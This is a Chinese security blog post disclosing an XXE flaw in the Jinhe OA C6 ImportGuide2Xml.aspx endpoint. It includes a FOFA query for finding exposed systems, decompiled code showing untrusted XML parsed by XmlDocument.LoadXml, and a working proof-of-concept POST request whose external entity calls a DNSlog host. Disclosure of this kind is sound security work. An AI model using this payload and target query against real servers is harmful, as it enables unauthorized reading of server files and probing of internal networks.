---
title: "金和OA ImportGuide2Xml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ImportGuide2Xml-xxe.html
asset_dir: assets/金和oa-importguide2xml.aspx-xxe漏洞
---

# 金和OA ImportGuide2Xml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/26 13:24
- 404浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

安全

计算机安全

漏洞扫描服务

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ImportGuide2Xml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

安全工具开发

防火墙软件

安全运维咨询

直接根据 `ImportGuide2Xml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **ImportGuide2Xml** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.InitText();
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.Appraise/ImportGuide2Xml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA ImportGuide2Xml.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
